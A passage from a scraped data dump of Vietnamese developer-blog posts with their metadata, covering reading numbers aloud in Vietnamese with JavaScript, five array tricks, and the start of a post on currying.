h\u01b0\u1edbng gi\u1ea3i quy\u1ebft\n\nB\u01b0\u1edbc \u0111\u1ea7u ti\u00ean c\u1ea7n l\u00e0m l\u00e0 suy ngh\u0129 \u0111\u1ec3 t\u00ecm ra \u0111\u01b0\u1ee3c **\u0111i\u1ec3m m\u1ea5u ch\u1ed1t**. Gi\u1ed1ng nh\u01b0 khi b\u1ea1n ch\u01a1i **x\u1ebfp h\u00ecnh** (theo \u0111\u00fang ngh\u0129a \u0111en). Khi b\u1eaft \u0111\u1ea7u, m\u1eb9o l\u00e0 t\u00ecm \u0111\u01b0\u1ee3c 4 g\u00f3c tr\u01b0\u1edbc ti\u00ean (\u0111\u1eebng quan t\u00e2m c\u00e1i \u1ea3nh nh\u00e9 :joy:)\n\n![](https://images.viblo.asia/5fc7b36a-8124-4330-80bb-4d5708125f22.jpg)\n\n\u0110\u1ed1i v\u1edbi b\u00e0i to\u00e1n \u0111\u1ecdc s\u1ed1 n\u00e0y c\u0169ng v\u1eady. Ch\u00fang ta c\u0169ng c\u1ea7n t\u00ecm ra \u0111\u01b0\u1ee3c c\u00e1c b\u01b0\u1edbc nh\u01b0 sau:\n\n* Xem qua c\u00e1c tr\u01b0\u1eddng h\u1ee3p (case) m\u1eabu \u0111\u1ec3 x\u00e1c \u0111\u1ecbnh \u0111i\u1ec3m chung, quy lu\u1eadt\n* X\u00e9t t\u1edbi c\u00e1c tr\u01b0\u1eddng h\u1ee3p bi\u1ebfn th\u1ec3 c\u1ee7a t\u1eadp m\u1eabu, v\u00ed d\u1ee5 t\u1ea1i sao \u0111\u1ecdc `m\u01b0\u1eddi b\u1ed1n` m\u00e0 kh\u00f4ng \u0111\u1ecdc `m\u01b0\u1eddi t\u01b0`?\n* Chia t\u00e1ch v\u1ea5n \u0111\u1ec1 th\u00e0nh nh\u1eefng vi\u1ec7c nh\u1ecf h\u01a1n, v\u00e0 sau \u0111\u00f3 gh\u00e9p l\u1ea1i ho\u00e0n ch\u1ec9nh\n\nV\u1edbi b\u01b0\u1edbc 1 v\u00e0 2, t\u1edb ngh\u0129 m\u1ecdi ng\u01b0\u1eddi ai c\u0169ng c\u00f3 th\u1ec3 t\u1ef1 l\u00e0m v\u00e0 ng\u1eabm ra \u0111\u01b0\u1ee3c, n\u00ean m\u00ecnh s\u1ebd l\u01b0\u1edbt nhanh qua ph\u1ea7n n\u00e0y nh\u00e9. C\u00f2n \u1edf b\u01b0\u1edbc 3 m\u00ecnh s\u1ebd \u0111i s\u00e2u h\u01a1n v\u00e0o c\u00e1ch chia t\u00e1ch b\u00e0i to\u00e1n l\u1edbn ra th\u00e0nh c\u00e1c b\u00e0i to\u00e1n nh\u1ecf h\u01a1n nh\u01b0 th\u1ebf n\u00e0o.\n\n## 2. T\u1edb \u0111\u00e3 l\u00e0m t\u1eebng b\u01b0\u1edbc nh\u01b0 th\u1ebf n\u00e0o?\n\n### 2.1. T\u00ecm ra quy lu\u1eadt chung\n\nV\u1edbi c\u00e1c s\u1ed1 d\u00e0i, d\u1ec5 d\u00e0ng nh\u1eadn ra ch\u00fang c\u00f3 quy lu\u1eadt \u0111\u1ecdc theo t\u1eebng nh\u00f3m 3 s\u1ed1, r\u1ed3i g\u1eafn th\u00eam ph\u1ea7n \u0111\u01a1n v\u1ecb c\u1ee7a t\u1eebng nh\u00f3m l\u00e0 \u0111\u01b0\u1ee3c. V\u00ed d\u1ee5 nh\u00e9.\n\n> 402 045 014 = Hai m\u01b0\u01a1i ba (t\u1ef7) b\u1ed1n tr\u0103m l\u1ebb hai (tri\u1ec7u), kh\u00f4ng tr\u0103m b\u1ed1n m\u01b0\u01a1i l\u0103m (ng\u00e0n), kh\u00f4ng tr\u0103m m\u01b0\u1eddi b\u1ed1n (\u0111\u01a1n v\u1ecb)\n> \n> 15 042 = M\u01b0\u1eddi l\u0103m (ngh\u00ecn), kh\u00f4ng tr\u0103m b\u1ed1n m\u01b0\u01a1i hai (\u0111\u01a1n v\u1ecb)\n\nDo \u0111\u00f3, b\u01b0\u1edbc \u0111\u1ea7u c\u1ea7n th\u1ef1c hi\u1ec7n x\u1eed l\u00fd v\u00e0 chia nh\u00f3m c\u00e1c ch\u1eef s\u1ed1 ra tr\u01b0\u1edbc. G\u1ed3m 2 b\u01b0\u1edbc:\n\n* Th\u00eam c\u00e1c s\u1ed1 0 \u1edf \u0111\u1ea7u (leading zeros) cho s\u1ed1 l\u01b0\u1ee3ng ch\u1eef s\u1ed1 chia h\u1ebft cho 3 (\u0111\u1ec3 chia c\u1ee5m cho \u0111\u1ec1u)\n* M\u1ed7i l\u1ea7n \u0111\u1ecdc l\u1ea7n l\u01b0\u1ee3t 3 s\u1ed1, sau \u0111\u00f3 l\u1ea5y k\u1ebft qu\u1ea3 \u0111\u1ecdc \u0111\u01b0\u1ee3c g\u1eafn th\u00eam ph\u1ea7n \u0111\u01a1n v\u1ecb cho n\u00f3 (t\u1ef7, tri\u1ec7u, ngh\u00ecn, \u0111\u01a1n v\u1ecb,...)\n\n```js\nlet num = '23402045014';\n\n// T\u00ednh s\u1ed1 l\u01b0\u1ee3ng s\u1ed1 0 c\u1ea7n th\u00eam v\u00e0o\nlet needZeroCount = num.length % 3;\nif (needZeroCount != 0)\n    needZeroCount = 3 - needZeroCount;\n    \n// Th\u00eam needZeroCount s\u1ed1 0 cho \u0111\u1ee7\nnum = '0'.repeat(needZeroCount) + num;\n```\n\nXong b\u01b0\u1edbc n\u00e0y, bi\u1ebfn `num` \u0111\u00e3 h\u1ee3p l\u1ec7 v\u00e0 ti\u1ebfp t\u1ee5c qua b\u01b0\u1edbc hai.\n\n### 2.2. \u0110\u1ecdc l\u1ea7n l\u01b0\u1ee3t t\u1eebng nh\u00f3m 3 s\u1ed1\n\nCh\u00fang ta \u0111\u00e3 c\u00f3 chu\u1ed7i `num` c\u00f3 \u0111\u1ed9 d\u00e0i chia h\u1ebft cho 3, do \u0111\u00f3 ch\u00fang ta c\u1ea7n duy\u1ec7t l\u1ea7n l\u01b0\u1ee3t t\u1eebng nh\u00f3m nh\u01b0 sau. M\u1ed7i l\u1ea7n duy\u1ec7t s\u1ebd l\u1ea5y ra gi\u00e1 tr\u1ecb v\u00e0o 3 bi\u1ebfn `a`, `b`, `c`.\n\n```js\nfor (let i = 0; i < num.length / 3; i++) {\n    // L\u1ea5y ra 3 s\u1ed1 a, b, c b\u1eb1ng array destructuring\n    let [a, b, c] = num.substr(i * 3, 3);\n    console.log(a, b, c);\n    \n    // Gh\u00e9p th\u00eam \u0111\u01a1n v\u1ecb t\u00ednh sau m\u1ed7i nh\u00f3m\n    ...\n}\n```\n\n### 2.3. Gh\u00e9p th\u00eam \u0111\u01a1n v\u1ecb t\u00ednh\n\nNh\u01b0 \u1edf tr\u00ean, sau khi \u0111\u1ecdc xong m\u1ed9t nh\u00f3m (g\u1ed3m 3 s\u1ed1 `a`, `b`, `c`), ch\u00fang ta s\u1ebd \u0111\u1ecdc th\u00eam \u0111\u01a1n v\u1ecb t\u00ednh c\u1ee7a nh\u00f3m \u0111\u00f3.\n\nM\u00ecnh d\u00f9ng m\u1ed9t m\u1ea3ng string ch\u1ee9a c\u00e1c \u0111\u01a1n v\u1ecb t\u1eeb th\u1ea5p \u0111\u1ebfn cao.\n\n```js\nconst UNITS = ['\u0111\u01a1n v\u1ecb', 'ngh\u00ecn', 'tri\u1ec7u', 't\u1ec9'];\n```\n\nV\u1ea5n \u0111\u1ec1 \u1edf \u0111\u00e2y l\u00e0 l\u00e0m sao bi\u1ebft d\u00f9ng \u0111\u01a1n v\u1ecb n\u00e0o \u1edf ph\u1ea7n n\u00e0o. D\u1ec5 th\u1ea5y ph\u1ea7n cu\u1ed1i v\u00f2ng l\u1eb7p th\u00ec d\u00f9ng \u0111\u01a1n v\u1ecb \u0111\u1ea7u ti\u00ean. Do \u0111\u00f3 ch\u00fang ta ch\u1ec9 c\u1ea7n \u0111\u1ea3o ng\u01b0\u1ee3c l\u1ea1i l\u00e0 \u0111\u01b0\u1ee3c (l\u1ea5y index nh\u00f3m cu\u1ed1i c\u00f9ng tr\u1eeb cho `i`).\n\n```js\n// T\u1ed5ng s\u1ed1 ph\u1ea7n l\u00e0 num.length / 3\nfor (let i = 0; i < num.length / 3; i++) {\n    let [a, b, c] = num.substr(i * 3, 3);\n    console.log(a, b, c, UNITS[num.length / 3 - 1 - i]);\n}\n```\n\n### 2.4. Ho\u00e0n ch\u1ec9nh code\n\n> \u01a0 code tr\u00ean th\u00ec ch\u1ec9 t\u00e1ch chu\u1ed7i input ra th\u00e0nh t\u1eebng nh\u00f3m th\u00f4i m\u00e0. M\u1ed7i nh\u00f3m g\u1ed3m 3 ch\u1eef s\u1ed1 `a`, `b`, `c` ch\u1ee9 c\u00f3 \u0111\u1ecdc g\u00ec \u0111\u00e2u\n\n\u0110\u00fang, c\u00f3 th\u1ec3 b\u1ea1n s\u1ebd th\u1eafc m\u1eafc nh\u01b0 th\u1ebf. Nh\u01b0ng \u0111\u1eebng lo, \u1edf \u0111\u00e2y ch\u00fang ta \u0111ang gi\u1ea3i quy\u1ebft v\u1ea5n \u0111\u1ec1 t\u1ed5ng th\u1ec3 tr\u01b0\u1edbc. C\u00f2n c\u00e1ch \u0111\u1ecdc c\u00e1c s\u1ed1 m\u00ecnh s\u1ebd tr\u00ecnh b\u00e0y \u1edf b\u00e0i vi\u1ebft sau.\n\nDo \u0111\u00f3, m\u00ecnh s\u1ebd vi\u1ebft th\u00eam m\u1ed9t function `readThree(a, b, c)` \u0111\u1ec3 \u0111\u1ecdc s\u1ed1. Hi\u1ec7n t\u1ea1i th\u00ec n\u00f3 ch\u1ec9 c\u00f3 in s\u1ed1 ra th\u00f4i nh\u00e9.\n\n```js\nfunction readThree(a, b, c) {\n    return a + ' ' + b + ' ' + c;\n}\n```\n\nV\u00e0 k\u1ebft qu\u1ea3 cu\u1ed1i c\u00f9ng \u0111\u00e2y, t\u00e8n ten.\n\n```js\nlet num = '23402045014';\n\n// T\u00ednh s\u1ed1 l\u01b0\u1ee3ng s\u1ed1 0 c\u1ea7n th\u00eam v\u00e0o\nlet needZeroCount = num.length % 3;\nif (needZeroCount != 0)\n    needZeroCount = 3 - needZeroCount;\n    \n// Th\u00eam needZeroCount s\u1ed1 0 cho \u0111\u1ee7\nnum = '0'.repeat(needZeroCount) + num;\n\n// \u0110\u1ecbnh ngh\u0129a c\u00e1c \u0111\u01a1n v\u1ecb \u0111o\nconst UNITS = ['\u0111\u01a1n v\u1ecb', 'ngh\u00ecn', 'tri\u1ec7u', 't\u1ec9'];\n\n// \u0110\u1ecbnh ngh\u0129a function \u0111\u1ecdc s\u1ed1 3 ch\u1eef s\u1ed1\nfunction readThree(a, b, c) {\n    return a + ' ' + b + ' ' + c;\n}\n\n// \u0110\u1ecdc t\u1eebng ph\u1ea7n\nfor (let i = 0; i < num.length / 3; i++) {\n    let [a, b, c] = num.substr(i * 3, 3);\n    console.log(readThree(a, b, c), UNITS[num.length / 3 - 1 - i]);\n}\n```\n\n![](https://images.viblo.asia/b4ac1ab5-2782-4b37-9b7e-4b091a17139f.png)\n\n## 3. V\u1ea5n \u0111\u1ec1 v\u1edbi k\u1ebft qu\u1ea3\n\n### 3.1. Code tr\u00ean c\u00f3 v\u1ea5n \u0111\u1ec1 g\u00ec?\n\nCode tr\u00ean c\u00f3 m\u1ed9t v\u1ea5n \u0111\u1ec1, \u0111\u00f3 l\u00e0 \u0111\u00f4i khi s\u1ebd b\u1ecb th\u1eeba ho\u1eb7c thi\u1ebfu kho\u1ea3ng tr\u1eafng trong chu\u1ed7i output. V\u00ed d\u1ee5 nh\u01b0.\n\n```shell\n103 302  # M\u1ed9t tr\u0103m l\u1ebb ba ngh\u00ecn  ba tr\u0103m  l\u1ebb hai\u0111\u01a1n v\u1ecb\n```\n\nL\u00fac m\u00ecnh m\u1edbi l\u00e0m c\u0169ng g\u1eb7p ph\u1ea3i v\u1ea5n \u0111\u1ec1 n\u00e0y. Nguy\u00ean nh\u00e2n l\u00e0 do ch\u00fang ta s\u1eed d\u1ee5ng space c\u00f9ng v\u1edbi c\u00e1c t\u1eeb, do \u0111\u00f3 s\u1ebd b\u1ecb t\u00ecnh tr\u1ea1ng c\u00e1c t\u1eeb tr\u00f9ng nhau th\u00ec b\u1ecb d\u01b0, thi\u1ebfu space nh\u01b0 tr\u00ean.\n\n### 3.2. C\u00e1ch gi\u1ea3i quy\u1ebft\n\nC\u00f3 hai gi\u1ea3i ph\u00e1p cho v\u1ea5n \u0111\u1ec1 tr\u00ean:\n\n* **C\u00e1ch 1:** x\u00f3a \u0111i c\u00e1c v\u1ecb tr\u00ed c\u00f3 nhi\u1ec1u space li\u00ean ti\u1ebfp, ch\u1ec9 gi\u1eef l\u1ea1i m\u1ed9t. Tuy nhi\u00ean, c\u00e1ch n\u00e0y kh\u00f4ng th\u1ec3 fix \u0111\u01b0\u1ee3c tr\u01b0\u1eddng h\u1ee3p b\u1ecb thi\u1ebfu kho\u1ea3ng tr\u1eafng.\n* **C\u00e1ch 2:** d\u00f9ng m\u1ed9t m\u1ea3ng `output` v\u00e0 th\u00eam l\u1ea7n l\u01b0\u1ee3t c\u00e1c t\u1eeb ri\u00eang r\u1ebd v\u00e0o. Cu\u1ed1i c\u00f9ng th\u00ec n\u1ed1i l\u1ea1i th\u00e0nh chu\u1ed7i b\u1eb1ng method `join()`.\n\nDo \u0111\u00f3, m\u00ecnh s\u1ebd d\u00f9ng c\u00e1ch th\u1ee9 hai, khi \u00e1p d\u1ee5ng v\u00e0o code s\u1ebd gi\u1ed1ng nh\u01b0 sau.\n\n```js\nfunction readThree(a, b, c) {\n    // Tr\u1ea3 v\u1ec1 d\u1ea1ng m\u1ea3ng\n    return [a, b, c];\n}\n\n// Khi th\u00eam m\u1ed9t t\u1eeb v\u00e0o th\u00ec ch\u1ec9 c\u1ea7n push v\u00e0o m\u1ea3ng output\nconst output = [];\nfor (let i = 0; i < num.length / 3; i++) {\n    let [a, b, c] = num.substr(i * 3, 3);\n    output.push(...readThree(a, b, c);  // D\u00f9ng spread operator\n    output.push(UNITS[num.length / 3 - 1 - i]);\n}\n\n// Sau khi ho\u00e0n t\u1ea5t th\u00ec ch\u1ec9 c\u1ea7n join l\u1ea1i l\u00e0 \u0111\u01b0\u1ee3c\nconsole.log(output.join(' '));\n```\n\nXong xu\u00f4i, \u0111\u01a1n gi\u1ea3n \u0111\u00fang kh\u00f4ng n\u00e8 :joy: \n\n---\n\nB\u00e0i vi\u1ebft \u0111\u1ebfn \u0111\u00e2y l\u00e0 h\u1ebft r\u1ed3i, m\u00ecnh t\u1ea1m d\u1eebng t\u1ea1i \u0111\u00e2y. V\u00e0 \u0111\u1eebng qu\u00ean \u0111\u00f3n xem ph\u1ea7n hai nh\u00e9, ch\u00fang ta s\u1ebd c\u00f9ng \u0111i ti\u1ebfp v\u1ec1 c\u00e1ch \u0111\u1ecdc s\u1ed1 c\u00f3 \u00edt h\u01a1n 3 ch\u1eef s\u1ed1, r\u1ed3i gh\u00e9p l\u1ea1i th\u00e0nh code ho\u00e0n ch\u1ec9nh.\n\nCode m\u00ecnh share \u1edf \u0111\u00e2y nh\u00e9 https://repl.it/@tonghoangvu/Read-Vietnamese-number#phan-1.js.\n\nH\u00e3y th\u1eed v\u00e0 comment xu\u1ed1ng d\u01b0\u1edbi th\u1eafc m\u1eafc c\u1ee7a b\u1ea1n trong qu\u00e1 tr\u00ecnh th\u1ef1c hi\u1ec7n. N\u1ebfu b\u00e0i vi\u1ebft h\u1eefu \u00edch h\u00e3y cho m\u00ecnh 1 vote v\u00e0 clip \u0111\u1ec3 ti\u1ebfp th\u00eam \u0111\u1ed9ng l\u1ef1c nh\u00e9. Bye bye <3.",
      published_at: "2021-02-21 20:07:18",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 6,
      points: 7,
      views_count: 533,
      clips_count: 2,
      comments_count: 6,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/949625ed-df7a-4022-85e0-082fbbc335c8.jpg",
      user: {
        data: {
          id: 44447,
          url: "https://viblo.asia/u/tonghoangvu",
          avatar: "b0103728-95ff-4934-a588-f007f0d3b93a.png",
          name: "T\u1ed1ng Ho\u00e0ng V\u0169",
          username: "tonghoangvu",
          followers_count: 48,
          reputation: 1284,
          posts_count: 29,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 26266,
            url: "https://viblo.asia/u/012546",
            avatar: "33eef7ba-d5fd-457a-b577-a792fb21776c.jpeg",
            name: "T\u00f9ng D\u01b0\u01a1ng",
            username: "012546",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 39643,
            url: "https://viblo.asia/u/nvKhuong",
            avatar: "bffaabe5-ccc0-4288-b941-bbb2bbb97023.jpg",
            name: "Kh\u01b0\u01a1ng Nguy\u1ec5n",
            username: "nvKhuong",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 44447,
            url: "https://viblo.asia/u/tonghoangvu",
            avatar: "b0103728-95ff-4934-a588-f007f0d3b93a.png",
            name: "T\u1ed1ng Ho\u00e0ng V\u0169",
            username: "tonghoangvu",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 50922,
      title: "5 th\u1ee7 thu\u1eadt h\u1eefu \u00edch trong javascript",
      slug: "QpmleN275rd",
      url:
        "https://viblo.asia/p/5-thu-thuat-huu-ich-trong-javascript-QpmleN275rd",
      user_id: 40123,
      moderation: null,
      transliterated: "5-thu-thuat-huu-ich-trong-javascript",
      contents_short:
        "Trong b\u00e0i \u0111\u0103ng n\u00e0y, m\u00ecnh s\u1ebd show 5 th\u1ee7 thu\u1eadt javascript tuy\u1ec7t v\u1eddi, n\u00f3 s\u1ebd gi\u00fap vi\u1ec7c coding d\u1ec5 d\u00e0ng h\u01a1n. V\u00ec v\u1eady n\u1ebfu b\u1ea1n quan t\u00e2m, h\u00e3y ti\u1ebfp t\u1ee5c \u0111\u1ecdc nh\u00e9 ^^\n\n1. Lo\u1ea1i b\u1ecf nh\u1eefng ph\u1ea7n t\u1eed tr\u00f9ng nhau trong m\u1ea3...",
      contents:
        "Trong b\u00e0i \u0111\u0103ng n\u00e0y, m\u00ecnh s\u1ebd show 5 th\u1ee7 thu\u1eadt javascript tuy\u1ec7t v\u1eddi, n\u00f3 s\u1ebd gi\u00fap vi\u1ec7c coding d\u1ec5 d\u00e0ng h\u01a1n. V\u00ec v\u1eady n\u1ebfu b\u1ea1n quan t\u00e2m, h\u00e3y ti\u1ebfp t\u1ee5c \u0111\u1ecdc nh\u00e9 ^^ \n\n## 1. Lo\u1ea1i b\u1ecf nh\u1eefng ph\u1ea7n t\u1eed tr\u00f9ng nhau trong m\u1ea3ng!\n- Th\u1ee7 thu\u1eadt n\u00e0y kh\u00e1 \u0111\u01a1n gi\u1ea3n. Gi\u1ea3 s\u1eed b\u1ea1n c\u00f3 1 m\u1ea3ng ch\u1ee9a number, string, boolean, .. V\u00e0 trong m\u1ea3ng n\u00e0y b\u1ea1n mu\u1ed1n ch\u1eafc r\u1eb1ng kh\u00f4ng c\u00f3 ph\u1ea7n t\u1eed n\u00e0o tr\u00f9ng nhau. V\u00ec v\u1eady b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o c\u00e1ch d\u01b0\u1edbi \u0111\u00e2y\n```javascript\nconst array = [1, 2, 3, 2, 1, true, true, false, 'Ratul', 1, 5];\nconst filtered__array = [...new Set(array)];\nconsole.log(filtered__array) // [ 1, 2, 3, true, false, 'Ratul', 5 ]\n```\n\n## 2. Chuy\u1ec3n s\u1ed1 th\u1eadp ph\u00e2n th\u00e0nh s\u1ed1 nguy\u00ean\n\n```javascript\nconst number = 23.6565\nconsole.log(number | 0); // 23\n```\n\nho\u1eb7c \n```javascript\nconst number = 23.6565\nconsole.log(~~number); // 23\n```\n\n- Th\u1eadt \u0111\u01a1n gi\u1ea3n v\u00e0 ng\u1eafn g\u1ecdn ph\u1ea3i kh\u00f4ng n\u00e0o.\n\n## 3. L\u1ea5y gi\u00e1 tr\u1ecb cu\u1ed1i c\u00f9ng c\u1ee7a m\u1ed9t m\u1ea3ng\n- Gi\u1ea3 s\u1eed b\u1ea1n c\u00f3 m\u1ed9t m\u1ea3ng b\u1ea5t k\u1ef3, v\u00e0 mu\u1ed1n l\u1ea5y ph\u1ea7n t\u1eed cu\u1ed1i c\u00f9ng c\u1ee7a m\u1ea3ng \u0111\u00f3\n\n```javascript\nconst array = [1, 2, 3, 4, 5]\nconst last_Item = array.slice(-1)\nconsole.log(last_Item)\n```\nB\u00e2y gi\u1edd n\u1ebfu b\u1ea1n thay `-1`  th\u00e0nh `-2` th\u00ec b\u1ea1n s\u1ebd l\u1ea5y \u0111\u01b0\u1ee3c 2 gi\u00e1 tr\u1ecb cu\u1ed1i c\u00f9ng c\u1ee7a m\u1ea3ng. Nh\u01b0 v\u1eady  `-n` s\u1ebd l\u1ea5y `n` gi\u00e1 tr\u1ecb cu\u1ed1i c\u00f9ng c\u1ee7a m\u1ea3ng.\n\n## 4. L\u1ea5y ph\u1ea7n t\u1eed ng\u1eabu nhi\u00ean trong m\u1ed9t m\u1ea3ng\n\n```javascript\nconst participants = ['Ratul', 'George', 'july', 'Padrik', 'G']\nconst winner = participants[Math.floor(Math.random() * participants.length)]\nconsole.log(winner) // july was the winner \ud83d\ude0a\n```\n\n## 5. T\u00ecm t\u1eeb d\u00e0i nh\u1ea5t trong m\u1ea3ng\n```javascript\nconst someArray = ['Apple', 'Pine-apple', 'Banana', 'Jack-fruit']\n\nconst mostLengthy = someArray\n    .reduce((acc, i) => i.length > acc.length ? i : acc);\n)\n```\n\n## K\u1ebft lu\u1eadn\n- C\u1ea3m \u01a1n c\u00e1c b\u1ea1n \u0111\u00e3 \u0111\u1ecdc b\u00e0i. Hi v\u1ecdng v\u1edbi nh\u1eefng th\u1ee7 thu\u1eadt tr\u00ean s\u1ebd gi\u00fap \u00edch cho b\u1ea1n trong qu\u00e1 tr\u00ecnh coding. B\u00e0i vi\u1ebft tham kh\u1ea3o t\u1ea1i [\u0111\u00e2y](https://dev.to/ratuloss/5-useful-javascript-tricks-4kp8)",
      published_at: "2021-02-21 18:53:56",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-18 22:00:08",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 1,
      points: 1,
      views_count: 132,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 40123,
          url: "https://viblo.asia/u/khanhlt199",
          avatar: "d9a2ec4a-1b87-4f74-89a5-3725df60d2c6.jpg",
          name: "Kh\u00e1nh L\u00ea",
          username: "khanhlt199",
          followers_count: 6,
          reputation: 132,
          posts_count: 6,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 50923,
      title: "[Functional Programming] Part 2 - Currying",
      slug: "63vKj1QV52R",
      url:
        "https://viblo.asia/p/functional-programming-part-2-currying-63vKj1QV52R",
      user_id: 25988,
      moderation: null,
      transliterated: "functional-programming-part-2-currying",
      contents_short:
        "\u0110\u00e2y l\u00e0 ph\u1ea7n th\u1ee9 hai trong lo\u1ea1t b\u00e0i vi\u1ebft v\u1ec1 Functional Programming c\u1ee7a m\u00ecnh. N\u1ebfu b\u1ea1n \u0111\u00e3 b\u1ecf l\u1ee1 b\u00e0i vi\u1ebft tr\u01b0\u1edbc v\u1ec1 Immutability v\u00e0 Pure Functions, th\u00ec m\u00ecnh khuy\u00ean b\u1ea1n n\u00ean \u0111\u1ecdc n\u00f3 tr\u01b0\u1edbc (tr\u1eeb khi b\u1ea1n \u0111\u00e3 b...",
      contents:
        "\u0110\u00e2y l\u00e0 ph\u1ea7n th\u1ee9 hai trong lo\u1ea1t b\u00e0i vi\u1ebft v\u1ec1 Functional Programming c\u1ee7a m\u00ecnh. N\u1ebfu b\u1ea1n \u0111\u00e3 b\u1ecf l\u1ee1 b\u00e0i vi\u1ebft tr\u01b0\u1edbc v\u1ec1 [Immutability v\u00e0 Pure Functions](https://viblo.asia/p/functional-programming-part-1-immutability-va-pure-functions-Qbq5Q9VJ5D8), th\u00ec m\u00ecnh khuy\u00ean b\u1ea1n n\u00ean \u0111\u1ecdc n\u00f3 tr\u01b0\u1edbc (tr\u1eeb khi b\u1ea1n \u0111\u00e3 bi\u1ebft v\u1ec1 c\u00e1c kh\u00e1i ni\u1ec7m n\u00e0y).\n\n-----\n\n# Currying\nH\u00f4m nay, ch\u00fang ta s\u1ebd t\u00ecm hi\u1ec3u v\u1ec1 Currying. V\u00e2\u0323y n\u00f3 l\u00e0 c\u00e1i g\u00ec? N\u00f3i m\u1ed9t c\u00e1ch ng\u1eafn g\u1ecdn th\u00ec \u0111\u00f3 l\u00e0 m\u1ed9t k\u1ef9 thu\u1eadt gi\u00fap b\u1ea1n c\u00f3 th\u1ec3 g\u1ecdi **m\u1ed9t ph\u1ea7n** h\u00e0m c\u1ee7a m\u00ecnh \u0111\u1ec3 t\u1ea1o ra m\u1ed9t h\u00e0m ho\u00e0n to\u00e0n m\u1edbi, h\u00e0m m\u1edbi n\u00e0y s\u1ebd b\u1edbt \u0111i m\u1ed9t s\u1ed1 tham s\u1ed1 so v\u1edbi h\u00e0m tr\u01b0\u1edbc \u0111\u00f3 (c\u00e1c tham s\u1ed1 b\u1ecb b\u1edbt \u0111i n\u00e0y \u0111\u01b0\u1ee3c apply s\u1eb5n v\u00e0o h\u00e0m m\u1edbi ngay khi h\u00e0m \u0111\u01b0\u1ee3c g\u1ecdi).\n<br>\n\n\u0110\u1ec3 t\u1ea1o ra m\u1ed9t curried function, thay v\u00ec khai b\u00e1o h\u00e0m nh\u01b0 th\u1ebf n\u00e0y:\n```javascript\nfunction add (a, b) {\n    return a + b\n}\n```\n\nCh\u00fang ta s\u1ebd khai b\u00e1o nh\u01b0 th\u1ebf n\u00e0y:\n```javascript\nfunction add (a) {\n    return function (b) {\n        return a + b\n    }\n}\n```\n\nCh\u1eafc l\u00e0 c\u00e1c b\u1ea1n s\u1ebd th\u1ea5y c\u00e1ch khai b\u00e1o n\u00e0y h\u01a1i k\u00ec. \u1ede \u0111\u00e2y, h\u00e0m b\u00ean trong c\u00f3 quy\u1ec1n truy c\u1eadp v\u00e0o `a` do ch\u00fang ta \u00e1p d\u1ee5ng closure (m\u1ed9t h\u00e0m c\u00f3 quy\u1ec1n truy c\u1eadp v\u00e0o t\u1ea5t c\u1ea3 c\u00e1c bi\u1ebfn \u0111\u01b0\u1ee3c khai b\u00e1o b\u00ean ngo\u00e0i n\u00f3).\n<br>\n\nC\u00e1c b\u1ea1n ch\u1eafc h\u1eb3n s\u1ebd th\u1ea5y c\u00e1c h\u00e0m nh\u01b0 th\u1ebf n\u00e0y kh\u00f3 \u0111\u1ecdc h\u01a1n c\u00e1c h\u00e0m \u0111\u01b0\u1ee3c vi\u1ebft theo c\u00e1ch \u201cb\u00ecnh th\u01b0\u1eddng\u201d. Nh\u01b0ng may m\u1eafn cho ch\u00fang ta, h\u00e0m n\u00e0y c\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c c\u1ea5u tr\u00fac l\u1ea1i b\u1eb1ng c\u00fa ph\u00e1p ES6 nh\u01b0 sau:\n```javascript\nconst add = a => b => a + b;\n```\n\nC\u00f3 th\u1ec3 b\u1ea1n s\u1ebd th\u1ea5y l\u1ea1 n\u1ebfu b\u1ea1n ch\u01b0a t\u1eebng th\u1ea5y c\u00fa ph\u00e1p n\u00e0y tr\u01b0\u1edbc \u0111\u00e2y. \u1ede \u0111\u00e2y m\u00ecnh \u0111\u00e3 d\u00f9ng c\u00fa ph\u00e1p arrow function c\u1ee7a ES6. L\u01b0u \u00fd r\u1eb1ng m\u00ecnh kh\u00f4ng s\u1eed d\u1ee5ng t\u1eeb kh\u00f3a `return` \u1edf \u0111\u00e2y. Khi b\u1ea1n ngay l\u1eadp t\u1ee9c tr\u1ea3 v\u1ec1 m\u1ed9t gi\u00e1 tr\u1ecb trong h\u00e0m c\u1ee7a m\u00ecnh, b\u1ea1n c\u00f3 th\u1ec3 lo\u1ea1i b\u1ecf t\u1eeb kh\u00f3a return v\u00e0 tr\u00ecnh th\u00f4ng d\u1ecbch v\u1eabn s\u1ebd hi\u1ec3u \u0111\u01b0\u1ee3c n\u00f3. B\u1ea1n c\u00f3 th\u1ec3 b\u1ecf 